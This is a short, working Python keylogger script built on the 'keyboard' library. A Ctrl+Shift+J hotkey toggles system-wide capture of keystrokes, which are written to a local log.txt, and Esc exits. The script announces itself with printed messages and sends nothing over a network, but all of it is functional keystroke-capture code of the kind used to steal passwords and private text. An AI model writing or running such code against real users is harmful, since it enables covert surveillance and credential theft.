import keyboard as kb
logger = False
ignore = ["shift", "ctrl", "tab", "caps lock"]


def activate_logger():
    global logger, text
    if logger:
        logger = False
        print("keyLogger deactivated")
        with open("log.txt", "w") as file:
            # Clean file
            file.write("")
            text.pop(0)


            for char in text:
                if char == "enter":
                    file.write("\n")
                else:
                    file.write(char)

    else:
        logger = True
        print("keyLogger activated")
        text = []

def log_key(event):
    global logger, text
    pressed_key = event.name
    if logger:
        if pressed_key in ignore:
            return 
        else:
            if pressed_key == "space":
                text.append(" ")
            elif pressed_key == "backspace":
                text.pop()
            else:
                text.append(pressed_key)
            


kb.on_press(log_key) 




kb.add_hotkey("ctrl + shift + j", activate_logger)


kb.wait("esc")
print("Exiting program!")